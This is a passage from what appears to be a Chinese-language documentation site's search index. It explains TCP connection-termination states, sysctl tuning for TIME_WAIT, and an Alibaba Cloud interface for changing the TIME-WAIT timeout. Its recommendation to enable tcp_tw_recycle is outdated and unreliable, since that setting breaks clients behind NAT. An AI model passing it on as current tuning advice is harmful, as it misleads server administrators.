FIN_WAIT_2\uff1a\u4e0a\u9762\u5df2\u7ecf\u8be6\u7ec6\u89e3\u91ca\u4e86\u8fd9\u79cd\u72b6\u6001\uff0c\u5b9e\u9645\u4e0aFIN_WAIT_2\u72b6\u6001\u4e0b\u7684SOCKET\uff0c\u8868\u793a\u534a\u8fde\u63a5\uff0c\u4e5f\u5373\u6709\u4e00\u65b9\u8981\u6c42close\u8fde\u63a5\uff0c\u4f46\u53e6\u5916\u8fd8\u544a\u8bc9\u5bf9\u65b9\uff0c\u6211\u6682\u65f6\u8fd8\u6709\u70b9\u6570\u636e\u9700\u8981\u4f20\u9001\u7ed9\u4f60\uff0c\u7a0d\u540e\u518d\u5173\u95ed\u8fde\u63a5\u3002 TIME_WAIT\uff1a\u8868\u793a\u6536\u5230\u4e86\u5bf9\u65b9\u7684FIN\u62a5\u6587\uff0c\u5e76\u53d1\u9001\u51fa\u4e86ACK\u62a5\u6587\uff0c\u5c31\u7b492MSL\u540e\u5373\u53ef\u56de\u5230CLOSED\u53ef\u7528\u72b6\u6001\u4e86\u3002\u5982\u679cFIN_WAIT_1\u72b6\u6001\u4e0b\uff0c\u6536\u5230\u4e86\u5bf9\u65b9\u540c\u65f6\u5e26FIN\u6807\u5fd7\u548cACK\u6807\u5fd7\u7684\u62a5\u6587\u65f6\uff0c\u53ef\u4ee5\u76f4\u63a5\u8fdb\u5165\u5230TIME_WAIT\u72b6\u6001\uff0c\u800c\u65e0\u987b\u7ecf\u8fc7FIN_WAIT_2\u72b6\u6001\u3002 \u6ce8:MSL(\u6700\u5927\u5206\u6bb5\u751f\u5b58\u671f)\u6307\u660eTCP\u62a5\u6587\u5728Internet\u4e0a\u6700\u957f\u751f\u5b58\u65f6\u95f4,\u6bcf\u4e2a\u5177\u4f53\u7684TCP\u5b9e\u73b0\u90fd\u5fc5\u987b\u9009\u62e9\u4e00\u4e2a\u786e\u5b9a\u7684MSL\u503c.RFC 1122\u5efa\u8bae\u662f2\u5206\u949f,\u4f46BSD\u4f20\u7edf\u5b9e\u73b0\u91c7\u7528\u4e8630\u79d2.TIME_WAIT \u72b6\u6001\u6700\u5927\u4fdd\u6301\u65f6\u95f4\u662f2 * MSL,\u4e5f\u5c31\u662f1-4\u5206\u949f. CLOSING\uff1a\u8fd9\u79cd\u72b6\u6001\u6bd4\u8f83\u7279\u6b8a\uff0c\u5b9e\u9645\u60c5\u51b5\u4e2d\u5e94\u8be5\u662f\u5f88\u5c11\u89c1\uff0c\u5c5e\u4e8e\u4e00\u79cd\u6bd4\u8f83\u7f55\u89c1\u7684\u4f8b\u5916\u72b6\u6001\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5f53\u4f60\u53d1\u9001FIN\u62a5\u6587\u540e\uff0c\u6309\u7406\u6765\u8bf4\u662f\u5e94\u8be5\u5148\u6536\u5230\uff08\u6216\u540c\u65f6\u6536\u5230\uff09\u5bf9\u65b9\u7684ACK\u62a5\u6587\uff0c\u518d\u6536\u5230\u5bf9\u65b9\u7684FIN\u62a5\u6587\u3002\u4f46\u662fCLOSING\u72b6\u6001\u8868\u793a\u4f60\u53d1\u9001FIN\u62a5\u6587\u540e\uff0c\u5e76\u6ca1\u6709\u6536\u5230\u5bf9\u65b9\u7684ACK\u62a5\u6587\uff0c\u53cd\u800c\u5374\u4e5f\u6536\u5230\u4e86\u5bf9\u65b9\u7684FIN\u62a5\u6587\u3002\u4ec0\u4e48\u60c5\u51b5\u4e0b\u4f1a\u51fa\u73b0\u6b64\u79cd\u60c5\u51b5\u5462\uff1f\u5176\u5b9e\u7ec6\u60f3\u4e00\u4e0b\uff0c\u4e5f\u4e0d\u96be\u5f97\u51fa\u7ed3\u8bba\uff1a\u90a3\u5c31\u662f\u5982\u679c\u53cc\u65b9\u51e0\u4e4e\u5728\u540c\u65f6close\u4e00\u4e2aSOCKET\u7684\u8bdd\uff0c\u90a3\u4e48\u5c31\u51fa\u73b0\u4e86\u53cc\u65b9\u540c\u65f6\u53d1\u9001FIN\u62a5\u6587\u7684\u60c5\u51b5\uff0c\u4e5f\u5373\u4f1a\u51fa\u73b0CLOSING\u72b6\u6001\uff0c\u8868\u793a\u53cc\u65b9\u90fd\u6b63\u5728\u5173\u95edSOCKET\u8fde\u63a5\u3002 CLOSE_WAIT\uff1a\u8fd9\u79cd\u72b6\u6001\u7684\u542b\u4e49\u5176\u5b9e\u662f\u8868\u793a\u5728\u7b49\u5f85\u5173\u95ed\u3002\u600e\u4e48\u7406\u89e3\u5462\uff1f\u5f53\u5bf9\u65b9close\u4e00\u4e2aSOCKET\u540e\u53d1\u9001FIN\u62a5\u6587\u7ed9\u81ea\u5df1\uff0c\u4f60\u7cfb\u7edf\u6beb\u65e0\u7591\u95ee\u5730\u4f1a\u56de\u5e94\u4e00\u4e2aACK\u62a5\u6587\u7ed9\u5bf9\u65b9\uff0c\u6b64\u65f6\u5219\u8fdb\u5165\u5230CLOSE_WAIT\u72b6\u6001\u3002\u63a5\u4e0b\u6765\u5462\uff0c\u5b9e\u9645\u4e0a\u4f60\u771f\u6b63\u9700\u8981\u8003\u8651\u7684\u4e8b\u60c5\u662f\u5bdf\u770b\u4f60\u662f\u5426\u8fd8\u6709\u6570\u636e\u53d1\u9001\u7ed9\u5bf9\u65b9\uff0c\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0c\u90a3\u4e48\u4f60\u4e5f\u5c31\u53ef\u4ee5close\u8fd9\u4e2aSOCKET\uff0c\u53d1\u9001FIN\u62a5\u6587\u7ed9\u5bf9\u65b9\uff0c\u4e5f\u5373\u5173\u95ed\u8fde\u63a5\u3002\u6240\u4ee5\u4f60\u5728CLOSE_WAIT\u72b6\u6001\u4e0b\uff0c\u9700\u8981\u5b8c\u6210\u7684\u4e8b\u60c5\u662f\u7b49\u5f85\u4f60\u53bb\u5173\u95ed\u8fde\u63a5\u3002 LAST_ACK\uff1a\u8fd9\u4e2a\u72b6\u6001\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u597d\u7406\u89e3\u7684\uff0c\u5b83\u662f\u88ab\u52a8\u5173\u95ed\u4e00\u65b9\u5728\u53d1\u9001FIN\u62a5\u6587\u540e\uff0c\u6700\u540e\u7b49\u5f85\u5bf9\u65b9\u7684ACK\u62a5\u6587\u3002\u5f53\u6536\u5230ACK\u62a5\u6587\u540e\uff0c\u4e5f\u5373\u53ef\u4ee5\u8fdb\u5165\u5230CLOSED\u53ef\u7528\u72b6\u6001\u4e86\u3002 \u6700\u540e\u67092\u4e2a\u95ee\u9898\u7684\u56de\u7b54\uff0c\u6211\u81ea\u5df1\u5206\u6790\u540e\u7684\u7ed3\u8bba\uff08\u4e0d\u4e00\u5b9a\u4fdd\u8bc1100%\u6b63\u786e\uff09 1\u3001 \u4e3a\u4ec0\u4e48\u5efa\u7acb\u8fde\u63a5\u534f\u8bae\u662f\u4e09\u6b21\u63e1\u624b\uff0c\u800c\u5173\u95ed\u8fde\u63a5\u5374\u662f\u56db\u6b21\u63e1\u624b\u5462\uff1f \u8fd9\u662f\u56e0\u4e3a\u670d\u52a1\u7aef\u7684LISTEN\u72b6\u6001\u4e0b\u7684SOCKET\u5f53\u6536\u5230SYN\u62a5\u6587\u7684\u5efa\u8fde\u8bf7\u6c42\u540e\uff0c\u5b83\u53ef\u4ee5\u628aACK\u548cSYN\uff08ACK\u8d77\u5e94\u7b54\u4f5c\u7528\uff0c\u800cSYN\u8d77\u540c\u6b65\u4f5c\u7528\uff09\u653e\u5728\u4e00\u4e2a\u62a5\u6587\u91cc\u6765\u53d1\u9001\u3002\u4f46\u5173\u95ed\u8fde\u63a5\u65f6\uff0c\u5f53\u6536\u5230\u5bf9\u65b9\u7684FIN\u62a5\u6587\u901a\u77e5\u65f6\uff0c\u5b83\u4ec5\u4ec5\u8868\u793a\u5bf9\u65b9\u6ca1\u6709\u6570\u636e\u53d1\u9001\u7ed9\u4f60\u4e86\uff1b\u4f46\u672a\u5fc5\u4f60\u6240\u6709\u7684\u6570\u636e\u90fd\u5168\u90e8\u53d1\u9001\u7ed9\u5bf9\u65b9\u4e86\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u672a\u5fc5\u4f1a\u9a6c\u4e0a\u4f1a\u5173\u95edSOCKET,\u4e5f\u5373\u4f60\u53ef\u80fd\u8fd8\u9700\u8981\u53d1\u9001\u4e00\u4e9b\u6570\u636e\u7ed9\u5bf9\u65b9\u4e4b\u540e\uff0c\u518d\u53d1\u9001FIN\u62a5\u6587\u7ed9\u5bf9\u65b9\u6765\u8868\u793a\u4f60\u540c\u610f\u73b0\u5728\u53ef\u4ee5\u5173\u95ed\u8fde\u63a5\u4e86\uff0c\u6240\u4ee5\u5b83\u8fd9\u91cc\u7684ACK\u62a5\u6587\u548cFIN\u62a5\u6587\u591a\u6570\u60c5\u51b5\u4e0b\u90fd\u662f\u5206\u5f00\u53d1\u9001\u7684\u3002 2\u3001 \u4e3a\u4ec0\u4e48TIME_WAIT\u72b6\u6001\u8fd8\u9700\u8981\u7b492MSL\u540e\u624d\u80fd\u8fd4\u56de\u5230CLOSED\u72b6\u6001\uff1f \u8fd9\u662f\u56e0\u4e3a\uff1a\u867d\u7136\u53cc\u65b9\u90fd\u540c\u610f\u5173\u95ed\u8fde\u63a5\u4e86\uff0c\u800c\u4e14\u63e1\u624b\u76844\u4e2a\u62a5\u6587\u4e5f\u90fd\u534f\u8c03\u548c\u53d1\u9001\u5b8c\u6bd5\uff0c\u6309\u7406\u53ef\u4ee5\u76f4\u63a5\u56de\u5230CLOSED\u72b6\u6001\uff08\u5c31\u597d\u6bd4\u4eceSYN_SEND\u72b6\u6001\u5230ESTABLISH\u72b6\u6001\u90a3\u6837\uff09\uff1b\u4f46\u662f\u56e0\u4e3a\u6211\u4eec\u5fc5\u987b\u8981\u5047\u60f3\u7f51\u7edc\u662f\u4e0d\u53ef\u9760\u7684\uff0c\u4f60\u65e0\u6cd5\u4fdd\u8bc1\u4f60\u6700\u540e\u53d1\u9001\u7684ACK\u62a5\u6587\u4f1a\u4e00\u5b9a\u88ab\u5bf9\u65b9\u6536\u5230\uff0c\u56e0\u6b64\u5bf9\u65b9\u5904\u4e8eLAST_ACK\u72b6\u6001\u4e0b\u7684SOCKET\u53ef\u80fd\u4f1a\u56e0\u4e3a\u8d85\u65f6\u672a\u6536\u5230ACK\u62a5\u6587\uff0c\u800c\u91cd\u53d1FIN\u62a5\u6587\uff0c\u6240\u4ee5\u8fd9\u4e2aTIME_WAIT\u72b6\u6001\u7684\u4f5c\u7528\u5c31\u662f\u7528\u6765\u91cd\u53d1\u53ef\u80fd\u4e22\u5931\u7684ACK\u62a5\u6587\uff0c\u5e76\u4fdd\u8bc1\u4e8e\u6b64\u3002 \u67e5\u770b\u5f53\u524d\u7cfb\u7edf\u4e0b\u6240\u6709\u8fde\u63a5\u72b6\u6001\u7684\u6570\uff1a [root@vps ~]#netstat -n|awk '/^tcp/{++S[$NF]}END{for (key in S) print key,S[key]}' TIME_WAIT 286 FIN_WAIT1 5 FIN_WAIT2 6 ESTABLISHED 269 SYN_RECV 5 CLOSING 1 \u5982\u53d1\u73b0\u7cfb\u7edf\u5b58\u5728\u5927\u91cfTIME_WAIT\u72b6\u6001\u7684\u8fde\u63a5\uff0c\u901a\u8fc7\u8c03\u6574\u5185\u6838\u53c2\u6570\u89e3\u51b3\uff1a \u7f16\u8f91\u6587\u4ef6/etc/sysctl.conf\uff0c\u52a0\u5165\u4ee5\u4e0b\u5185\u5bb9\uff1a net.ipv4.tcp_syncookies = 1 net.ipv4.tcp_tw_reuse = 1 net.ipv4.tcp_tw_recycle = 1 net.ipv4.tcp_fin_timeout = 30 \u7136\u540e\u6267\u884c /sbin/sysctl -p \u8ba9\u53c2\u6570\u751f\u6548\u3002 net.ipv4.tcp_syncookies = 1 \u8868\u793a\u5f00\u542fSYN Cookies\u3002\u5f53\u51fa\u73b0SYN\u7b49\u5f85\u961f\u5217\u6ea2\u51fa\u65f6\uff0c\u542f\u7528cookies\u6765\u5904\u7406\uff0c\u53ef\u9632\u8303\u5c11\u91cfSYN\u653b\u51fb\uff0c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u5173\u95ed\uff1b net.ipv4.tcp_tw_reuse = 1 \u8868\u793a\u5f00\u542f\u91cd\u7528\u3002\u5141\u8bb8\u5c06TIME-WAIT sockets\u91cd\u65b0\u7528\u4e8e\u65b0\u7684TCP\u8fde\u63a5\uff0c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u5173\u95ed\uff1b net.ipv4.tcp_tw_recycle = 1 \u8868\u793a\u5f00\u542fTCP\u8fde\u63a5\u4e2dTIME-WAIT sockets\u7684\u5feb\u901f\u56de\u6536\uff0c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u5173\u95ed\u3002 net.ipv4.tcp_fin_timeout \u4fee\u6539\u7cfb\u9ed8\u8ba4\u7684 TIMEOUT \u65f6\u95f4 \u5176\u5b83\u53c2\u6570\u8bf4\u660e\uff1a net.ipv4.tcp_syncookies = 1 \u8868\u793a\u5f00\u542fSYN Cookies\u3002\u5f53\u51fa\u73b0SYN\u7b49\u5f85\u961f\u5217\u6ea2\u51fa\u65f6\uff0c\u542f\u7528cookies\u6765\u5904\u7406\uff0c\u53ef\u9632\u8303\u5c11\u91cfSYN\u653b\u51fb\uff0c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u5173\u95ed\uff1b net.ipv4.tcp_tw_reuse = 1 \u8868\u793a\u5f00\u542f\u91cd\u7528\u3002\u5141\u8bb8\u5c06TIME-WAIT sockets\u91cd\u65b0\u7528\u4e8e\u65b0\u7684TCP\u8fde\u63a5\uff0c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u5173\u95ed\uff1b net.ipv4.tcp_tw_recycle = 1 \u8868\u793a\u5f00\u542fTCP\u8fde\u63a5\u4e2dTIME-WAIT sockets\u7684\u5feb\u901f\u56de\u6536\uff0c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u5173\u95ed\u3002 net.ipv4.tcp_fin_timeout = 30 \u8868\u793a\u5982\u679c\u5957\u63a5\u5b57\u7531\u672c\u7aef\u8981\u6c42\u5173\u95ed\uff0c\u8fd9\u4e2a\u53c2\u6570\u51b3\u5b9a\u4e86\u5b83\u4fdd\u6301\u5728FIN-WAIT-2\u72b6\u6001\u7684\u65f6\u95f4\u3002 net.ipv4.tcp_keepalive_time = 1200 \u8868\u793a\u5f53keepalive\u8d77\u7528\u7684\u65f6\u5019\uff0cTCP\u53d1\u9001keepalive\u6d88\u606f\u7684\u9891\u5ea6\u3002\u7f3a\u7701\u662f2\u5c0f\u65f6\uff0c\u6539\u4e3a20\u5206\u949f\u3002 net.ipv4.ip_local_port_range = 1024 65000 \u8868\u793a\u7528\u4e8e\u5411\u5916\u8fde\u63a5\u7684\u7aef\u53e3\u8303\u56f4\u3002\u7f3a\u7701\u60c5\u51b5\u4e0b\u5f88\u5c0f\uff1a32768\u523061000\uff0c\u6539\u4e3a1024\u523065000\u3002 net.ipv4.tcp_max_syn_backlog = 8192 \u8868\u793aSYN\u961f\u5217\u7684\u957f\u5ea6\uff0c\u9ed8\u8ba4\u4e3a1024\uff0c\u52a0\u5927\u961f\u5217\u957f\u5ea6\u4e3a8192\uff0c\u53ef\u4ee5\u5bb9\u7eb3\u66f4\u591a\u7b49\u5f85\u8fde\u63a5\u7684\u7f51\u7edc\u8fde\u63a5\u6570\u3002 net.ipv4.tcp_max_tw_buckets = 5000 \u8868\u793a\u7cfb\u7edf\u540c\u65f6\u4fdd\u6301TIME_WAIT\u5957\u63a5\u5b57\u7684\u6700\u5927\u6570\u91cf\uff0c\u5982\u679c\u8d85\u8fc7\u8fd9\u4e2a\u6570\u5b57\uff0cTIME_WAIT\u5957\u63a5\u5b57\u5c06\u7acb\u523b\u88ab\u6e05\u9664\u5e76\u6253\u5370\u8b66\u544a\u4fe1\u606f\u3002\u9ed8\u8ba4\u4e3a180000\uff0c\u6539\u4e3a5000\u3002\u5bf9\u4e8eApache\u3001Nginx\u7b49\u670d\u52a1\u5668\uff0c\u4e0a\u51e0\u884c\u7684\u53c2\u6570\u53ef\u4ee5\u5f88\u597d\u5730\u51cf\u5c11TIME_WAIT\u5957\u63a5\u5b57\u6570\u91cf\uff0c\u4f46\u662f\u5bf9\u4e8eSquid\uff0c\u6548\u679c\u5374\u4e0d\u5927\u3002\u6b64\u9879\u53c2\u6570\u53ef\u4ee5\u63a7\u5236TIME_WAIT\u5957\u63a5\u5b57\u7684\u6700\u5927\u6570\u91cf\uff0c\u907f\u514dSquid\u670d\u52a1\u5668\u88ab\u5927\u91cf\u7684TIME_WAIT\u5957\u63a5\u5b57\u62d6\u6b7b\u3002 \u6ce8: net.ipv4.tcp_tw_reuse = 1 net.ipv4.tcp_tw_recycle = 1 \u8bbe\u7f6e\u8fd9\u4e24\u4e2a\u53c2\u6570\uff1a reuse\u662f\u8868\u793a\u662f\u5426\u5141\u8bb8\u91cd\u65b0\u5e94\u7528\u5904\u4e8eTIME-WAIT\u72b6\u6001\u7684socket\u7528\u4e8e\u65b0\u7684TCP\u8fde\u63a5 recyse\u662f\u52a0\u901fTIME-WAIT sockets\u56de\u6536","title":"2\u3001\u8fde\u63a5\u7ec8\u6b62\u534f\u8bae\uff08\u56db\u6b21\u63e1\u624b\uff09"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E4%BF%AE%E6%94%B9TCP%E7%9A%84TIME-WAIT%E8%B6%85%E6%97%B6%E6%97%B6%E9%97%B4/","text":"\u5728Linux\u7684\u5185\u6838\u4e2d\uff0cTCP/IP\u534f\u8bae\u7684TIME-WAIT\u72b6\u6001\u6301\u7eed60\u79d2\u4e14\u65e0\u6cd5\u4fee\u6539\u3002\u4f46\u5728\u67d0\u4e9b\u573a\u666f\u4e0b\uff0c\u4f8b\u5982TCP\u8d1f\u8f7d\u8fc7\u9ad8\u65f6\uff0c\u9002\u5f53\u8c03\u5c0f\u8be5\u503c\u6709\u52a9\u4e8e\u63d0\u5347\u7f51\u7edc\u6027\u80fd\u3002\u56e0\u6b64Alibaba Cloud Linux 2\u4ece\u5185\u6838\u7248\u672c4.19.43-13.al7\u5f00\u59cb\uff0c\u65b0\u589e\u5185\u6838\u63a5\u53e3\u7528\u4e8e\u4fee\u6539TCP TIME-WAIT\u8d85\u65f6\u65f6\u95f4\u3002\u672c\u6587\u4e3b\u8981\u4ecb\u7ecd\u8be5\u63a5\u53e3\u7684\u4f7f\u7528\u65b9\u6cd5\u3002 \u80cc\u666f\u4fe1\u606f TCP/IP\u534f\u8bae\u7684TIME-WAIT\u72b6\u6001\u662f\u6307\u5e94\u7528\u5173\u95ed\u7528\u4e8e\u901a\u4fe1\u7684\u5957\u63a5\u53e3\uff08socket\uff09\u4e4b\u540e\uff0cTCP/IP\u534f\u8bae\u6808\u4fdd\u6301socket\u5904\u4e8e\u6253\u5f00\u72b6\u6001\u3002\u8be5\u72b6\u6001\u9ed8\u8ba4\u6301\u7eed60\u79d2\uff0c\u7528\u6765\u4fdd\u8bc1\u5b8c\u6210\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u7684\u6570\u636e\u4f20\u8f93\u3002\u5f53\u5904\u4e8eTIME-WAIT\u72b6\u6001\u7684\u8fde\u63a5\u6570\u8fc7\u591a\u65f6\uff0c\u53ef\u80fd\u4f1a\u5f71\u54cd\u5230\u7f51\u7edc\u6027\u80fd\u3002\u56e0\u6b64Alibaba Cloud Linux 2\u63d0\u4f9b\u4e86\u53ef\u4fee\u6539TIME-WAIT\u8d85\u65f6\u65f6\u95f4\u7684\u63a5\u53e3\uff0c\u7528\u4e8e\u5728\u7279\u5b9a\u573a\u666f\u63d0\u9ad8\u7f51\u7edc\u6027\u80fd\u3002\u4f8b\u5982\uff0c\u9ad8\u5e76\u53d1\u4e1a\u52a1\u573a\u666f\u3002\u8be5\u63a5\u53e3\u7684\u53d6\u503c\u8303\u56f4\u4e3a[1, 600]\uff0c\u5355\u4f4d\u4e3a\u79d2\u3002\u5982\u679c\u4e0d\u4fee\u6539\u8be5\u63a5\u53e3\uff0cTIME-WAIT\u8d85\u65f6\u65f6\u95f4\u7684\u9ed8\u8ba4\u503c\u4fdd\u630160\u79d2\u4e0d\u53d8\u3002 \u6ce8\u610f\u4e8b\u9879 \u5c06TCP TIME-WAIT\u8d85\u65f6\u65f6\u95f4\u4fee\u6539\u4e3a\u5c0f\u4e8e60\u79d2\u4e0eTCP/IP\u534f\u8baequiet time\u6982\u5ff5\u76f8\u8fdd\u80cc\uff0c\u53ef\u80fd\u5bfc\u81f4\u60a8\u7684\u7cfb\u7edf\u5c06\u65e7\u6570\u636e\u5f53\u505a\u65b0\u6570\u636e\u63a5\u6536\uff0c\u6216\u8005\u590d\u5236\u7684\u65b0\u6570\u636e\u5f53\u505a\u65e7\u6570\u636e\u62d2\u7edd\u3002\u56e0\u6b64\u8bf7\u5728\u7f51\u7edc\u4e13\u5bb6\u5efa\u8bae\u4e0b\u8c03\u6574\u3002\u4e86\u89e3TCP/IP\u534f\u8baequiet time\u7684\u76f8\u5173\u6982\u5ff5\uff0c\u8bf7\u53c2\u89c1 IETF RFC 793\u6807\u51c6 \u3002 \u914d\u7f6e\u65b9\u6cd5 \u60a8\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\u4fee\u6539TIME-WAIT\u8d85\u65f6\u65f6\u95f4\uff0c\u5176\u4e2d\u53c2\u6570[$TIME_VALUE]\u4e3a\u60a8\u4fee\u6539\u7684TIME-WAIT\u8d85\u65f6\u65f6\u95f4\u3002 \u901a\u8fc7 sysctl \u547d\u4ee4\u4fee\u6539TIME-WAIT\u8d85\u65f6\u65f6\u95f4\u3002 sysctl -w \"net.ipv4.tcp_tw_timeout=[$TIME_VALUE]\" \u4ee5root\u6743\u9650\u4f7f\u7528 echo \u547d\u4ee4\uff0c\u5c06\u503c\u4fee\u6539\u5230 /proc/sys/net/ipv4/tcp_tw_timeout \u63a5\u53e3\u4e2d\u3002 echo [$TIME_VALUE] > /proc/sys/net/ipv4/tcp_tw_timeout \u4f8b\u5982\uff0c\u5728Nginx\u914d\u7f6e7\u5c42\u4ee3\u7406\u7b49\u5b58\u5728\u5927\u91cf\u77ed\u8fde\u63a5\u7684\u573a\u666f\u4e0b\uff0c\u963f\u91cc\u4e91\u63a8\u8350\u60a8\u5c06TIME-WAIT\u8d85\u65f6\u65f6\u95f4\u4fee\u6539\u4e3a5s\u3002\u8fd0\u884c\u4ee5\u4e0b\u4efb\u4e00\u547d\u4ee4\u4fee\u6539\u8d85\u65f6\u65f6\u95f4\uff1a \u8bf4\u660e \u670d\u52a1\u5668\u4e2d\u662f\u5426\u5b58\u5728\u5927\u91cf\u77ed\u8fde\u63a5\uff0c\u60a8\u53ef\u4ee5\u8fd0\u884c netstat -ant | grep TIME_WAIT | wc -l \u547d\u4ee4\u8fdb\u884c\u5224\u65ad\u3002 bash sysctl -w \"net.ipv4.tcp_tw_timeout=5\" bash echo 5 > /proc/sys/net/ipv4/tcp_tw_timeout","title":"\u963f\u91cc\u4e91\u4fee\u6539TCP\u7684TIME-WAIT\u8d85\u65f6\u65f6\u95f4"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E4%BF%AE%E6%94%B9TCP%E7%9A%84TIME-WAIT%E8%B6%85%E6%97%B6%E6%97%B6%E9%97%B4/#_1","text":"TCP/IP\u534f\u8bae\u7684TIME-WAIT\u72b6\u6001\u662f\u6307\u5e94\u7528\u5173\u95ed\u7528\u4e8e\u901a\u4fe1\u7684\u5957\u63a5\u53e3\uff08socket\uff09\u4e4b\u540e\uff0cTCP/IP\u534f\u8bae\u6808\u4fdd\u6301socket\u5904\u4e8e\u6253\u5f00\u72b6\u6001\u3002\u8be5\u72b6\u6001\u9ed8\u8ba4\u6301\u7eed60\u79d2\uff0c\u7528\u6765\u4fdd\u8bc1\u5b8c\u6210\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u7684\u6570\u636e\u4f20\u8f93\u3002\u5f53\u5904\u4e8eTIME-WAIT\u72b6\u6001\u7684\u8fde\u63a5\u6570\u8fc7\u591a\u65f6\uff0c\u53ef\u80fd\u4f1a\u5f71\u54cd\u5230\u7f51\u7edc\u6027\u80fd\u3002\u56e0\u6b64Alibaba Cloud Linux 2\u63d0\u4f9b\u4e86\u53ef\u4fee\u6539TIME-WAIT\u8d85\u65f6\u65f6\u95f4\u7684\u63a5\u53e3\uff0c\u7528\u4e8e\u5728\u7279\u5b9a\u573a\u666f\u63d0\u9ad8\u7f51\u7edc\u6027\u80fd\u3002\u4f8b\u5982\uff0c\u9ad8\u5e76\u53d1\u4e1a\u52a1\u573a\u666f\u3002\u8be5\u63a5\u53e3\u7684\u53d6\u503c\u8303\u56f4\u4e3a[1, 600]\uff0c\u5355\u4f4d\u4e3a\u79d2\u3002\u5982\u679c\u4e0d\u4fee\u6539\u8be5\u63a5\u53e3\uff0cTIME-WAIT\u8d85\u65f6\u65f6\u95f4\u7684\u9ed8\u8ba4\u503c\u4fdd\u630160\u79d2\u4e0d\u53d8\u3002","title":"\u80cc\u666f\u4fe1\u606f"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E4%BF%AE%E6%94%B9TCP%E7%9A%84TIME-WAIT%E8%B6%85%E6%97%B6%E6%97%B6%E9%97%B4/#_2","text":"\u5c06TCP TIME-WAIT\u8d85\u65f6\u65f6\u95f4\u4fee\u6539\u4e3a\u5c0f\u4e8e60\u79d2\u4e0eTCP/IP\u534f\u8baequiet time\u6982\u5ff5\u76f8\u8fdd\u80cc\uff0c\u53ef\u80fd\u5bfc\u81f4\u60a8\u7684\u7cfb\u7edf\u5c06\u65e7\u6570\u636e\u5f53\u505a\u65b0\u6570\u636e\u63a5\u6536\uff0c\u6216\u8005\u590d\u5236\u7684\u65b0\u6570\u636e\u5f53\u505a\u65e7\u6570\u636e\u62d2\u7edd\u3002\u56e0\u6b64\u8bf7\u5728\u7f51\u7edc\u4e13\u5bb6\u5efa\u8bae\u4e0b\u8c03\u6574\u3002\u4e86\u89e3TCP/IP\u534f\u8baequiet time\u7684\u76f8\u5173\u6982\u5ff5\uff0c\u8bf7\u53c2\u89c1 IETF RFC 793\u6807\u51c6 \u3002","title":"\u6ce8\u610f\u4e8b\u9879"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E4%BF%AE%E6%94%B9TCP%E7%9A%84TIME-WAIT%E8%B6%85%E6%97%B6%E6%97%B6%E9%97%B4/#_3","text":"\u60a8\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\u4fee\u6539TIME-WAIT\u8d85\u65f6\u65f6\u95f4\uff0c\u5176\u4e2d\u53c2\u6570[$TIME_VALUE]\u4e3a\u60a8\u4fee\u6539\u7684TIME-WAIT\u8d85\u65f6\u65f6\u95f4\u3002 \u901a\u8fc7 sysctl \u547d\u4ee4\u4fee\u6539TIME-WAIT\u8d85\u65f6\u65f6\u95f4\u3002 sysctl -w \"net.ipv4.tcp_tw_timeout=[$TIME_VALUE]\" \u4ee5root\u6743\u9650\u4f7f\u7528 echo \u547d\u4ee4\uff0c\u5c06\u503c\u4fee\u6539\u5230 /proc/sys/net/ipv4/tcp_tw_timeout \u63a5\u53e3\u4e2d\u3002 echo [$TIME_VALUE] > /proc/sys/net/ipv4/tcp_tw_timeout \u4f8b\u5982\uff0c\u5728Nginx\u914d\u7f6e7\u5c42\u4ee3\u7406\u7b49\u5b58\u5728\u5927\u91cf\u77ed\u8fde\u63a5\u7684\u573a\u666f\u4e0b\uff0c\u963f\u91cc\u4e91\u63a8\u8350\u60a8\u5c06TIME-WAIT\u8d85\u65f6\u65f6\u95f4\u4fee\u6539\u4e3a5s\u3002\u8fd0\u884c\u4ee5\u4e0b\u4efb\u4e00\u547d\u4ee4\u4fee\u6539\u8d85\u65f6\u65f6\u95f4\uff1a \u8bf4\u660e \u670d\u52a1\u5668\u4e2d\u662f\u5426\u5b58\u5728\u5927\u91cf\u77ed\u8fde\u63a5\uff0c\u60a8\u53ef\u4ee5\u8fd0\u884c netstat -ant | grep TIME_WAIT | wc -l \u547d\u4ee4\u8fdb\u884c\u5224\u65ad\u3002 bash sysctl -w \"net.ipv4.tcp_tw_timeout=5\" bash echo 5 > /proc/sys/net/ipv4/tcp_tw_timeout","title":"\u914d\u7f6e\u65b9\u6cd5"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E5%85%A8%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97%E5%92%8C%E5%8D%8A%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97/","text":"\u5168\u8fde\u63a5\u961f\u5217\u548c\u534a\u8fde\u63a5\u961f\u5217 \u8fd9\u53ef\u80fd\u662f\u5168\u7f51\u8bb2\u7684\u6700\u7ec6\u81f4\u7684\u5168\u8fde\u63a5\u548c\u534a\u8fde\u63a5\u7684\u89e3\u6790\u4e86\u3002 \u5927\u81f4\u91ca\u4e49 \u9996\u5148\u5b66\u4e60\u4e00\u5f20\u56fe\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e09\u6b21\u63e1\u624b\u7684\u4e00\u4e2a\u8fc7\u7a0b\u3002 \u6211\u5728\u7f51\u4e0a\u627e\u4e86\u5f88\u4e45\uff0c\u5173\u4e8e\u534a\u8fde\u63a5\u961f\u5217\uff08sync queue\uff09\u548c\u5168\u8fde\u63a5\u961f\u5217\uff08accept 